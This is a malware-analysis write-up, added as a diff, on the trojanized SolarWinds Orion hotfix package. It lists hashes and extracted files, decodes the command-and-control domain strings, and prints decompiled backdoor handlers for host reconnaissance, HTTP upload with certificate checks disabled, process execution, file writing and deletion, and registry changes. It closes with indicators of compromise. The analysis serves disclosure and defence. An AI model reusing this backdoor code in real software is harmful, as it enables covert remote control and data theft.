@@ -1,0 +1,493 @@
+**SolarWinds-Core-v2019.4.5220-Hotfix5.msp (md5 02af7cec58b9a5da1c542b5a32151ba1)**
+
+![](https://raw.githubusercontent.com/qeeqbox/research/solarwinds/main/files/md5file.png)
+
+**SolarWinds-Core-v2019.4.5220-Hotfix5.msp metadata**
+
+```
+File: Composite Document File V2 Document, Little Endian 
+Os: Windows, Version 6.2, 
+Code page: 1252, 
+Title: Installation Database, 
+Subject: SolarWinds Orion Core Services 2019.4, 
+Author: SolarWinds Worldwide, LLC., 
+Keywords: Installer,
+Comments: This installer database contains the logic and data required to install SolarWinds Orion Core Services 2019.4.
+Create Time/Date: Tue Mar 24 11:55:04 2020,
+Name of Creating Application: Windows Installer XML Toolset (3.9.1208.0),
+Security: 4,
+Template: Intel;1033,
+Last Saved By: Intel;1033,
+Revision Number: {079A74C5-95D0-446E-86F7-B8EAF0A29654}119.4.20161.5220;{079A74C5-95D0-446E-86F7-B8EAF0A29654}119.4.20161.5220;{DA36F8E2-99FC-44DF-B011-09F6B063B0F7},
+Number of Pages: 200, Number of Characters: 152174623
+```
+
+**SolarWinds-Core-v2019.4.5220-Hotfix5.msp extracted files**
+
+![](https://raw.githubusercontent.com/qeeqbox/research/solarwinds/main/files/extracted.png)
+
+**SolarWinds-Core-v2019.4.5220-Hotfix5.msp extracted files md5**
+
+```
+34e9e373b21e8d8f0051f8c88e10008d  BigintOverflowFix.sql
+b03dcbc2ba9114b09c04ea24c9c63321  ClearOldDataFromDetailAndHourlyTables.sql
+60222d9d1766ca72eb7aa2aa79b76fad  ConfigurationWizard.exe
+79b811614f6e733192271ae8cee7db7e  ConfigurationWizard.exe.config
+8f9360404210799ebae3731dfc5dd93d  Core_Linux_2019.4.5200.9083.apkg
+a42d681ac61a4fa1d85f5812aaddd7a4  Core.Settings.json
+5026956e672613583a1fa4853f792301  dbsetup_pretimeseriesorder.txt
+a6a7552de53fb9011297fd8bec604d4e  Interop.NetFWTypeLib.dll
+c96d6e4342ffe7bcaea1abd744f084fd  Interop.olelib.dll
+39b3853848d7d01ff752c96e709dbae6  Interop.OrionSWScheduler8.dll
+b93e78593460cdddefcc44d6e51c86ba  Interop.TaskScheduler.dll
+c9799173b23ae28cfa58168ddc46e3fa  IS2.SolarWinds.Orion.Core.Common.dll
+572f3ab5036cc50e6e245c1ef1d084d9  IS3.SolarWinds.Data.Providers.Orion.Containers.v3.dll
+943d50919c7a8df571cd500e0a418a67  IS3.SolarWinds.Data.Providers.Orion.v3.dll
+c9799173b23ae28cfa58168ddc46e3fa  IS3.SolarWinds.Orion.Core.Common.dll
+be8fb541d3c916b4d91f59f331a62d41  ISv2.SolarWinds.Orion.Swis.PubSub.dll
+be8fb541d3c916b4d91f59f331a62d41  ISv3.SolarWinds.Orion.Swis.PubSub.dll
+2241d9333baa0b61b95efaf5c70144ea  NetPerfMon_WebSite.precompiled.zip
+0b9c58cbcf1bb2476b149c43d071959e  NetPerfMon_WebSite.zip
+b917980a6dad722a4970c7c326c6db9b  OrionCoreDatabaseScheme.dbConfig
+7905e0abd29412f11bb37c02aa370cc3  OrionWeb.dll
+423238911cb6be14866f815f7f234dca  Orion.xml
+f4c561e087aaa20e676aca2f5dfe516a  PM_2019.4_Patch.zip
+7392101b7b29b0d976db655cd6b08a18  SolarWinds.ConfigurationWizard.Plugin.Common.dll
+6a2c2a4d0b3b79ffd115d7f7b6ce8a8c  SolarWinds.ConfigurationWizard.Plugin.Orion.dll
+b5ab5b5a7c2e2421680f5f8b6ba86e84  SolarWinds.Database.TimeSeries.Contracts.dll
+db61b8bcf5b44b790dd99f6a6c5eedd7  SolarWinds.Database.TimeSeries.dll
+b12c00167341703faa428ec806ba9cc3  SolarWinds.Data.Entity.dll
+b91ce2fa41029f6955bff20079468448  SolarWinds.Orion.Core.BusinessLayer.dll  <--malicious
+510af37d73ab0378ec8c62c820536525  SolarWinds.Orion.Core.BusinessLayer.dll.config
+73a207c34cdf8f63eb9ef5252aba7022  SolarWinds.Orion.Core.Collector.dll
+c9799173b23ae28cfa58168ddc46e3fa  SolarWinds.Orion.Core.Common.dll
+0943bf039fadeec49f48ea488ce0225c  SolarWinds.Orion.Core.Strings.dll
+4010fef59f8aa41b476306095a6eb970  SolarWinds.Orion.Core.Strings.resources.dll.de.file
+4f27bace92d5f0fd4122e90f405d736c  SolarWinds.Orion.Core.Strings.resources.dll.ja.file
+be8fb541d3c916b4d91f59f331a62d41  SolarWinds.Orion.Swis.PubSub.dll
+123878cf5bb61c095369bad5b72bc516  Solarwinds.Settings.dll
+24c5cdcd69ed8466eda14e8ced59bdba  taskschd.dll
+c1c201388736053e9a883867dd5aba79  Toolset_2019.4_Patch.zip
+a56b277160c716b1454e8fa3a7322393  TruncateFirstAndLastPartitions.sql
+```
+
+**SolarWinds.Orion.Core.BusinessLayer.dll metadata**
+
+![](https://raw.githubusercontent.com/qeeqbox/research/solarwinds/main/files/businesslayermeta.png)
+
+**SolarWinds.Orion.Core.BusinessLayer.dll function**
+
+![](https://raw.githubusercontent.com/qeeqbox/research/solarwinds/main/files/function.png)
+
+**SolarWinds.Orion.Core.BusinessLayer.dll variables**
+
+![](https://raw.githubusercontent.com/qeeqbox/research/solarwinds/main/files/vars.png)
+
+**SolarWinds.Orion.Core.BusinessLayer.dll variables decoded**
+
+```
+SywrLstNzskvTdFLzs8FAA== avsvmcloud.com
+SywoKK7MS9ZNLMgEAA== appsync-api
+Sy3VLU8tLtE1BAA= eu-west-1
+Ky3WLU8tLtE1AgA= us-west-2
+Ky3WTU0sLtE1BAA= us-east-1
+Ky3WTU0sLtE1AgA= us-east-2
+```
+
+**SolarWinds.Orion.Core.BusinessLayer.dll c2**
+
+![](https://raw.githubusercontent.com/qeeqbox/research/solarwinds/main/files/vars.png)
+
+**SolarWinds.Orion.Core.BusinessLayer.dll c2 structure**
+
+private enum JobEngine
+{
+	Idle,
+	Exit,
+	SetTime,
+	CollectSystemDescription,
+	UploadSystemDescription,
+	RunTask,
+	GetProcessByDescription,
+	KillTask,
+	GetFileSystemEntries,
+	WriteFile,
+	FileExists,
+	DeleteFile,
+	GetFileHash,
+	ReadRegistryValue,
+	SetRegistryValue,
+	DeleteRegistryValue,
+	GetRegistrySubKeyAndValueNames,
+	Reboot,
+	None
+}```
+
+
+SetTime (Set delay for http helper)
+
+```
+public static void SetTime(string[] args, out int delay)
+{
+	delay = int.Parse(args[0]);
+}
+```
+
+CollectSystemDescription (get host info)
+
+```
+public static void CollectSystemDescription(string info, out string result)
+{
+	result = null;
+	int num = 0;
+	string domainName = IPGlobalProperties.GetIPGlobalProperties().DomainName;
+	result = result + OrionImprovementBusinessLayer.Job.GetDescriptionId(ref num) + domainName;
+	try
+	{
+		string str = ((SecurityIdentifier)new NTAccount(domainName, OrionImprovementBusinessLayer.ZipHelper.Unzip("c0zJzczLLC4pSizJLwIA")).Translate(typeof(SecurityIdentifier))).AccountDomainSid.ToString();
+		result = result + OrionImprovementBusinessLayer.Job.GetDescriptionId(ref num) + str;
+	}
+	catch
+	{
+		result += OrionImprovementBusinessLayer.Job.GetDescriptionId(ref num);
+	}
+	result = result + OrionImprovementBusinessLayer.Job.GetDescriptionId(ref num) + IPGlobalProperties.GetIPGlobalProperties().HostName;
+	result = result + OrionImprovementBusinessLayer.Job.GetDescriptionId(ref num) + Environment.UserName;
+	result = result + OrionImprovementBusinessLayer.Job.GetDescriptionId(ref num) + OrionImprovementBusinessLayer.GetOSVersion(true);
+	result = result + OrionImprovementBusinessLayer.Job.GetDescriptionId(ref num) + Environment.SystemDirectory;
+	result = result + OrionImprovementBusinessLayer.Job.GetDescriptionId(ref num) + (int)TimeSpan.FromMilliseconds(Environment.TickCount).TotalDays;
+	result = result + OrionImprovementBusinessLayer.Job.GetDescriptionId(ref num) + info + "\n";
+	result += OrionImprovementBusinessLayer.GetNetworkAdapterConfiguration();
+}
+
+```
+
+UploadSystemDescription (Perform http request)
+
+```
+public static void UploadSystemDescription(string[] args, out string result, IWebProxy proxy)
+{
+	result = null;
+	string requestUriString = args[0];
+	string s = args[1];
+	string text = (args.Length >= 3) ? args[2] : null;
+	string[] array = Encoding.UTF8.GetString(Convert.FromBase64String(s)).Split(new string[]
+	{
+		"\r\n",
+		"\r",
+		"\n"
+	}, StringSplitOptions.None);
+	HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(requestUriString);
+	HttpWebRequest httpWebRequest2 = httpWebRequest;
+	httpWebRequest2.ServerCertificateValidationCallback = (RemoteCertificateValidationCallback)Delegate.Combine(httpWebRequest2.ServerCertificateValidationCallback, new RemoteCertificateValidationCallback((object sender, X509Certificate cert, X509Chain chain, SslPolicyErrors sslPolicyErrors) => true));
+	httpWebRequest.Proxy = proxy;
+	httpWebRequest.Timeout = 120000;
+	httpWebRequest.Method = array[0].Split(new char[]
+	{
+		' '
+	})[0];
+	foreach (string text2 in array)
+	{
+		int num = text2.IndexOf(':');
+		if (num > 0)
+		{
+			string text3 = text2.Substring(0, num);
+			string text4 = text2.Substring(num + 1).TrimStart(Array.Empty<char>());
+			if (!WebHeaderCollection.IsRestricted(text3))
+			{
+				httpWebRequest.Headers.Add(text2);
+			}
+			else
+			{
+				ulong hash = OrionImprovementBusinessLayer.GetHash(text3.ToLower());
+				if (hash <= 8873858923435176895UL)
+				{
+					if (hash <= 6116246686670134098UL)
+					{
+						if (hash != 2734787258623754862UL)
+						{
+							if (hash == 6116246686670134098UL)
+							{
+								httpWebRequest.ContentType = text4;
+							}
+						}
+						else
+						{
+							httpWebRequest.Accept = text4;
+						}
+					}
+					else if (hash != 7574774749059321801UL)
+					{
+						if (hash == 8873858923435176895UL)
+						{
+							if (OrionImprovementBusinessLayer.GetHash(text4.ToLower()) == 1475579823244607677UL)
+							{
+								httpWebRequest.ServicePoint.Expect100Continue = true;
+							}
+							else
+							{
+								httpWebRequest.Expect = text4;
+							}
+						}
+					}
+					else
+					{
+						httpWebRequest.UserAgent = text4;
+					}
+				}
+				else if (hash <= 11266044540366291518UL)
+				{
+					if (hash != 9007106680104765185UL)
+					{
+						if (hash == 11266044540366291518UL)
+						{
+							ulong hash2 = OrionImprovementBusinessLayer.GetHash(text4.ToLower());
+							httpWebRequest.KeepAlive = (hash2 == 13852439084267373191UL || httpWebRequest.KeepAlive);
+							httpWebRequest.KeepAlive = (hash2 != 14226582801651130532UL && httpWebRequest.KeepAlive);
+						}
+					}
+					else
+					{
+						httpWebRequest.Referer = text4;
+					}
+				}
+				else if (hash != 15514036435533858158UL)
+				{
+					if (hash == 16066522799090129502UL)
+					{
+						httpWebRequest.Date = DateTime.Parse(text4);
+					}
+				}
+				else
+				{
+					httpWebRequest.Date = DateTime.Parse(text4);
+				}
+			}
+		}
+	}
+	result += string.Format(OrionImprovementBusinessLayer.ZipHelper.Unzip("qzaoVag2rFXwCAkJ0K82quUCAA=="), httpWebRequest.Method, httpWebRequest.Address.PathAndQuery, httpWebRequest.ProtocolVersion.ToString());
+	result = result + httpWebRequest.Headers.ToString() + "\n\n";
+	if (!string.IsNullOrEmpty(text))
+	{
+		using (Stream requestStream = httpWebRequest.GetRequestStream())
+		{
+			byte[] array3 = Convert.FromBase64String(text);
+			requestStream.Write(array3, 0, array3.Length);
+		}
+	}
+	using (WebResponse response = httpWebRequest.GetResponse())
+	{
+		result += string.Format("{0} {1}\n", (int)((HttpWebResponse)response).StatusCode, ((HttpWebResponse)response).StatusDescription);
+		result = result + response.Headers.ToString() + "\n";
+		using (Stream responseStream = response.GetResponseStream())
+		{
+			result += new StreamReader(responseStream).ReadToEnd();
+		}
+	}
+}
+```
+
+RunTask (Start a process)
+
+```
+public static int RunTask(string[] args, string cl, out string result)
+{
+	result = null;
+	string fileName = Environment.ExpandEnvironmentVariables(args[0]);
+	string arguments = (args.Length > 1) ? cl.Substring(OrionImprovementBusinessLayer.Job.GetArgumentIndex(cl, 1)).Trim() : null;
+	using (Process process = new Process())
+	{
+		process.StartInfo = new ProcessStartInfo(fileName, arguments)
+		{
+			CreateNoWindow = false,
+			UseShellExecute = false
+		};
+		if (process.Start())
+		{
+			result = process.Id.ToString();
+			return 0;
+		}
+	}
+	return 1;
+}
+
+```
+
+GetProcessByDescription (get processes info)
+
+```
+public static void GetProcessByDescription(string[] args, out string result)
+{
+	result = null;
+	if (args.Length == 0)
+	{
+		foreach (Process process in Process.GetProcesses())
+		{
+			result += string.Format(OrionImprovementBusinessLayer.ZipHelper.Unzip("i6420DGtjVWoNqzlAgA="), process.Id, OrionImprovementBusinessLayer.Quote(process.ProcessName));
+		}
+		return;
+	}
+	using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(OrionImprovementBusinessLayer.ZipHelper.Unzip("C07NSU0uUdBScCvKz1UIz8wzNooPKMpPTi0uBgA=")))
+	{
+		foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
+		{
+			ManagementObject managementObject = (ManagementObject)managementBaseObject;
+			string[] array = new string[]
+			{
+				string.Empty,
+				string.Empty
+			};
+			ManagementObject managementObject2 = managementObject;
+			string methodName = OrionImprovementBusinessLayer.ZipHelper.Unzip("c08t8S/PSy0CAA==");
+			object[] array2 = array;
+			object[] args2 = array2;
+			Convert.ToInt32(managementObject2.InvokeMethod(methodName, args2));
+			result += string.Format(OrionImprovementBusinessLayer.ZipHelper.Unzip("i6420DGtjVWoNtTRNTSrVag2quWsNgYKKVSb1MZUm9ZyAQA="), new object[]
+			{
+				managementObject[OrionImprovementBusinessLayer.ZipHelper.Unzip("CyjKT04tLvZ0AQA=")],
+				OrionImprovementBusinessLayer.Quote(managementObject[OrionImprovementBusinessLayer.ZipHelper.Unzip("80vMTQUA")].ToString()),
+				managementObject[args[0]],
+				managementObject[OrionImprovementBusinessLayer.ZipHelper.Unzip("C0gsSs0rCSjKT04tLvZ0AQA=")],
+				array[1],
+				array[0]
+			});
+		}
+	}
+}
+```
+
+KillTask (Kill a task by PID)
+
+```
+public static void KillTask(string[] args)
+{
+	Process.GetProcessById(int.Parse(args[0])).Kill();
+}
+```
+
+GetFileSystemEntries (Get files and folders by path)
+
+```
+public static void GetFileSystemEntries(string[] args, out string result)
+{
+	string searchPattern = (args.Length >= 2) ? args[1] : "*";
+	string path = Environment.ExpandEnvironmentVariables(args[0]);
+	string[] value = (from f in Directory.GetFiles(path, searchPattern)
+	select Path.GetFileName(f)).ToArray<string>();
+	string[] value2 = (from f in Directory.GetDirectories(path, searchPattern)
+	select Path.GetFileName(f)).ToArray<string>();
+	result = string.Join("\n", value2) + "\n\n" + string.Join(" \n", value);
+}
+```
+
+WriteFile (Write to file)
+
+```
+public static void WriteFile(string[] args)
+{
+	string path = Environment.ExpandEnvironmentVariables(args[0]);
+	byte[] array = Convert.FromBase64String(args[1]);
+	for (int i = 0; i < 3; i++)
+	{
+		try
+		{
+			using (FileStream fileStream = new FileStream(path, FileMode.Append, FileAccess.Write))
+			{
+				fileStream.Write(array, 0, array.Length);
+			}
+			break;
+		}
+		catch (Exception)
+		{
+			if (i + 1 >= 3)
+			{
+				throw;
+			}
+		}
+		OrionImprovementBusinessLayer.DelayMs(0.0, 0.0);
+	}
+}
+
+```
+
+FileExists (Check if file exists)
+
+```
+public static void FileExists(string[] args, out string result)
+{
+	string path = Environment.ExpandEnvironmentVariables(args[0]);
+	result = File.Exists(path).ToString();
+}
+
+```
+
+DeleteFile (delete file by path)
+
+```
+public static void DeleteFile(string[] args)
+{
+	File.Delete(Environment.ExpandEnvironmentVariables(args[0]));
+}
+```
+
+ReadRegistryValue (get a registry value)
+
+```
+public static int ReadRegistryValue(string[] args, out string result)
+{
+	result = OrionImprovementBusinessLayer.RegistryHelper.GetValue(args[0], args[1], null);
+	if (result != null)
+	{
+		return 0;
+	}
+	return 1;
+}
+```
+
+SetRegistryValue (modfiy a registry value)
+
+```
+public static int SetRegistryValue(string[] args)
+{
+	RegistryValueKind valueKind = (RegistryValueKind)Enum.Parse(typeof(RegistryValueKind), args[2]);
+	string valueData = (args.Length > 3) ? Encoding.UTF8.GetString(Convert.FromBase64String(args[3])) : "";
+	if (!OrionImprovementBusinessLayer.RegistryHelper.SetValue(args[0], args[1], valueData, valueKind))
+	{
+		return 1;
+	}
+	return 0;
+}
+```
+
+SetRegistryValue (delete a registry value)
+
+```
+public static void DeleteRegistryValue(string[] args)
+{
+	OrionImprovementBusinessLayer.RegistryHelper.DeleteValue(args[0], args[1]);
+}
+```
+
+GetRegistrySubKeyAndValueNames (get all registry keys and values)
+```
+public static void GetRegistrySubKeyAndValueNames(string[] args, out string result)
+{
+	result = OrionImprovementBusinessLayer.RegistryHelper.GetSubKeyAndValueNames(args[0]);
+}
+```
+
+IOC
+
+```
+02af7cec58b9a5da1c542b5a32151ba1
+b91ce2fa41029f6955bff20079468448
+```
+
+```
+.appsync-api.eu-west-1.avsvmcloud.com
+.appsync-api.eu-west-1.avsvmcloud.com 
+.appsync-api.eu-west-1.avsvmcloud.com
+.appsync-api.us-west-2.avsvmcloud.com
+.appsync-api.us-west-2.avsvmcloud.com
+.appsync-api.us-east-2.avsvmcloud.com
+```
